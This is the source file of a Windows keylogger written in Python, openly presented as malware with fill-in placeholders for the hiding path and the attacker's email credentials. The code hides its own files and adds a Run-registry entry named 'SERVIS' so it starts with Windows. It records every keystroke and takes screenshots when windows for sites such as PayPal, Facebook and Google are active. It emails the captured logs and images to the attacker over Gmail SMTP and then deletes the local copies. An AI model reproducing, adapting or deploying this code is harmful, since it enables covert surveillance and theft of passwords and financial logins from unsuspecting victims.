#!/usr/bin/python

from threading import Timer
from threading import Thread
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from PIL import Image, ImageGrab
import subprocess, socket, base64, time, datetime, os, sys, urllib2, platform, stat
import pythoncom, pyHook, win32api, win32gui, win32con, smtplib, string, win32file
import _winreg as wreg

if os.path.exists("PATH_YOU_WANT_TO_HIDE_YOUR_KEYLOGGER"):
    pass
else:
    os.makedirs("PATH_YOU_WANT_TO_HIDE_YOUR_KEYLOGGER")

if os.path.exists('PATH_YOU_WANT_TO_HIDE_YOUR_KEYLOGGER\\NAME_OF_YOUR_KEYLOGGER_FILE.exe'):
    pass
else:
    win32file.CopyFile('NAME_OF_YOUR_KEYLOGGER_FILE.exe', 'PATH_YOU_WANT_TO_HIDE_YOUR_KEYLOGGER\\NAME_OF_YOUR_KEYLOGGER_FILE.exe', 1)

# IF YOUR PATH IS LIKE: C:\\FOLDER1\\FOLDER2\\FOLDER3\\KEYLOGGER.EXE THEN CHANGE SETTIGNS BELOW LIKE:

win32api.SetFileAttributes('C:\\FOLDER1\\FOLDER2\\FOLDER3\\\NAME_OF_YOUR_KEYLOGGER_FILE.exe', win32con.FILE_ATTRIBUTE_HIDDEN)
win32api.SetFileAttributes('C:\\FOLDER1\\FOLDER2\\FOLDER3', win32con.FILE_ATTRIBUTE_HIDDEN)
win32api.SetFileAttributes('C:\\FOLDER1\\FOLDER2', win32con.FILE_ATTRIBUTE_HIDDEN)
win32api.SetFileAttributes('C:\\FOLDER1', win32con.FILE_ATTRIBUTE_HIDDEN)

if os.path.exists('PATH_YOU_WANT_TO_HIDE_YOUR_KEYLOGGER') and platform.architecture() == ('64bit', 'WindowsPE'):
    key = wreg.CreateKey(wreg.HKEY_LOCAL_MACHINE, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run")
    wreg.SetValueEx(key, 'SERVIS', 1, wreg.REG_SZ, '"PATH_YOU_WANT_TO_HIDE_YOUR_KEYLOGGER\\NAME_OF_YOUR_KEYLOGGER_FILE.exe"')
    key.Close()
else:
    key = wreg.CreateKey(wreg.HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run")
    wreg.SetValueEx(key, 'SERVIS', 1, wreg.REG_SZ, '"PATH_YOU_WANT_TO_HIDE_YOUR_KEYLOGGER\\NAME_OF_YOUR_KEYLOGGER_FILE.exe"')
    key.Close()

LOG_SENDMAIL = True
LOG_MAIL = 'your_mail@domain.com' #must be real address
LOG_PASS = 'your_password' #must be real password for email address in the line above
LOG_FROM = 'anon@yopmail.com'
LOG_SUBJ = 'Report'
LOG_MSG = ''
LOG_SCREENSHOT = True
LOG_SCREENSNUM = 5
LOG_INTERVAL = 2
LOG_SCREEN = []
LOG_SCREEN.append("Facebook")
LOG_SCREEN.append("Sign In")
LOG_SCREEN.append("Google")
LOG_SCREEN.append("Skype")
LOG_SCREEN.append("PayPal")
LOG_SCREEN.append("Yahoo")
LOG_SCREEN.append("Login")
LOG_SCREEN.append("Outlook")
LOG_SCREEN.append("Pik.ba")
LOG_SCREEN.append("GMX")
LOG_SCREEN.append("Word")
LOG_SCREEN.append("Excell")
LOG_SCREEN.append("WWINPoker")
LOG_SCREEN.append("WWin")
LOG_SCREEN.append("Twitter")
LOG_SCREEN.append("eBay")
LOG_FILENAME = 'info.txt'
LOG_TOSEND = []
LOG_ACTIVE = ''
LOG_STATE = False
LOG_TIME = 0
LOG_TEXT = ""
LOG_TEXTSIZE = 0
LOG_MINTERVAL = 60
LOG_THREAD_kl = 0
LOG_THREAD_ss = 0

main_thread_id = win32api.GetCurrentThreadId()


def Keylog(k, LOG_TIME, LOG_FILENAME):
    if os.name != 'nt': return "Not supported for this operating system.\n"
    global LOG_TEXT, LOG_FILE, LOG_STATE, LOG_ACTIVE, main_thread_id
    LOG_STATE = True
    main_thread_id = win32api.GetCurrentThreadId()
    LOG_TEXT += "\n===================================================\n"
    LOG_DATE = datetime.datetime.now()
    LOG_TEXT += ' ' + str(LOG_DATE) + ' >>> Logging started.. |\n'
    LOG_TEXT += "===================================================\n\n"
    w = win32gui
    LOG_ACTIVE = w.GetWindowText(w.GetForegroundWindow())
    LOG_DATE = datetime.datetime.now()
    LOG_TEXT += "[*] Window activated. [" + str(LOG_DATE) + "] \n"
    LOG_TEXT += "=" * len(LOG_ACTIVE) + "===\n"
    LOG_TEXT += " " + LOG_ACTIVE + " |\n"
    LOG_TEXT += "=" * len(LOG_ACTIVE) + "===\n\n"
    if LOG_TIME > 0:
	t = Timer(LOG_TIME, stopKeylog)
    	t.start()
    LOG_FILE = open(LOG_FILENAME, 'w')
    LOG_FILE.write(LOG_TEXT)
    LOG_FILE.close()
    hm = pyHook.HookManager()
    hm.KeyDown = OnKeyboardEvent
    hm.HookKeyboard()
    pythoncom.PumpMessages()
    LOG_FILE = open(LOG_FILENAME, 'a')
    LOG_TEXT += "\n\n===================================================\n"
    LOG_DATE = datetime.datetime.now()
    LOG_TEXT += " " + str(LOG_DATE) + ' >>> Logging finished. |\n'
    LOG_TEXT += "===================================================\n"
    LOG_STATE = False
    try:
    	LOG_FILE.write(LOG_TEXT)
    	LOG_FILE.close()
    except:
    	LOG_FILE.close()
    return True


def stopKeylog():
    win32api.PostThreadMessage(main_thread_id, win32con.WM_QUIT, 0, 0);


def OnKeyboardEvent(event):
    global LOG_STATE, LOG_THREAD_ss
    if LOG_STATE is False: return True
    global LOG_TEXT, LOG_FILE, LOG_FILENAME, LOG_ACTIVE, LOG_INTERVAL, LOG_SCREENSHOT, LOG_SCREENSNUM
    LOG_TEXT = ""
    LOG_FILE = open(LOG_FILENAME, 'a')
    wg = win32gui
    LOG_NEWACTIVE = wg.GetWindowText(wg.GetForegroundWindow())
    if LOG_NEWACTIVE != LOG_ACTIVE:
    	LOG_DATE = datetime.datetime.now()
    	LOG_TEXT += "\n\n[*] Window activated. [" + str(LOG_DATE) + "] \n"
    	LOG_TEXT += "=" * len(LOG_NEWACTIVE) + "===\n"
    	LOG_TEXT += " " + LOG_NEWACTIVE + " |\n"
    	LOG_TEXT += "=" * len(LOG_NEWACTIVE) + "===\n\n"
    	LOG_ACTIVE = LOG_NEWACTIVE
    	if LOG_SCREENSHOT is True:
    		LOG_IMG = 0
    		while LOG_IMG < len(LOG_SCREEN):
    		    if LOG_NEWACTIVE.find(LOG_SCREEN[LOG_IMG]) > 0:
	    		LOG_TEXT += "[*] Taking " + str(LOG_SCREENSNUM) + " screenshot for \"" + LOG_SCREEN[LOG_IMG] + "\" match.\n"
    			LOG_TEXT += "[*] Timestamp: " + str(datetime.datetime.now()) + "\n\n"
    			ss = Thread(target=takeScreenshots, args=(LOG_THREAD_ss, LOG_SCREENSNUM, LOG_INTERVAL))
    			ss.start()
    			LOG_THREAD_ss += 1
    		LOG_IMG += 1
	LOG_FILE.write(LOG_TEXT)
    LOG_TEXT = ""
    if event.Ascii == 8: LOG_TEXT += "\b"
    elif event.Ascii == 13 or event.Ascii == 9: LOG_TEXT += "\n"
    else: LOG_TEXT += str(chr(event.Ascii))
    LOG_FILE.write(LOG_TEXT)
    LOG_FILE.close()
    return True


def Screenshot():
    img = ImageGrab.grab()
    saveas = os.path.join(time.strftime('%Y_%m_%d_%H_%M_%S')+'.png')
    img.save(saveas)
    if LOG_SENDMAIL is True:
    	addFile = str(os.getcwd()) + "\\" + str(saveas)
    	LOG_TOSEND.append(addFile) 


def takeScreenshots(i, maxShots, intShots):
    for _ in range(maxShots):
        shottime = time.strftime('%Y_%m_%d_%H_%M_%S')
        Screenshot()
        time.sleep(intShots)



def sendEmail():
    msg = MIMEMultipart()
    msg['Subject'] = LOG_SUBJ
    msg['From'] = LOG_FROM
    msg['To'] = LOG_MAIL
    msg.preamble = LOG_MSG
    for file in LOG_TOSEND:
    	if file[-4:] == '.txt':
    		fp = open(file)
    		attach = MIMEText(fp.read())
    		fp.close()
    	elif file[-4:] == '.png':
    		fp = open(file, 'rb')
    		attach = MIMEImage(fp.read())
    		fp.close()
    	attach.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(file))
    	msg.attach(attach)
    server = smtplib.SMTP('smtp.gmail.com:587')
    server.starttls()
    server.login(LOG_MAIL, LOG_PASS)
    server.sendmail(LOG_FROM, LOG_MAIL, msg.as_string())
    server.quit()


def deleteFiles():
    if len(LOG_TOSEND) < 1: return True
    for file in LOG_TOSEND:
    	os.unlink(file)

kl = Thread(target=Keylog, args=(LOG_THREAD_kl,LOG_TIME,LOG_FILENAME))
kl.start()

if LOG_TIME < 1:
    while True:
	    time.sleep(LOG_MINTERVAL) 
	    LOG_NEWFILE = time.strftime('%Y_%m_%d_%H_%M_%S') + ".txt"
	    if LOG_SENDMAIL is True:
	    	addFile = str(os.getcwd()) + "\\" + str(LOG_NEWFILE)
	    	LOG_TOSEND.append(addFile)
		LOG_SAVEFILE = open(LOG_NEWFILE, 'w')
		LOG_CHCKSIZE = open(LOG_FILENAME, 'r')
		LOG_SAVEFILE.write(LOG_CHCKSIZE.read())
		LOG_CHCKSIZE.close()
		try:
			LOG_SAVEFILE.write(LOG_SAVETEXT)
			LOG_SAVEFILE.close()
		except:
			LOG_SAVEFILE.close()

		if LOG_SENDMAIL is True:
			sendEmail()
			time.sleep(6)
			deleteFiles()
		LOG_TOSEND = [] 
elif LOG_TIME > 0:
    time.sleep(LOG_TIME)
    time.sleep(2)
    if LOG_SENDMAIL is True:
	addFile = str(os.getcwd()) + "\\" + str(LOG_FILENAME)
	LOG_TOSEND.append(addFile)
	sendEmail()
	time.sleep(2)

sys.exit()
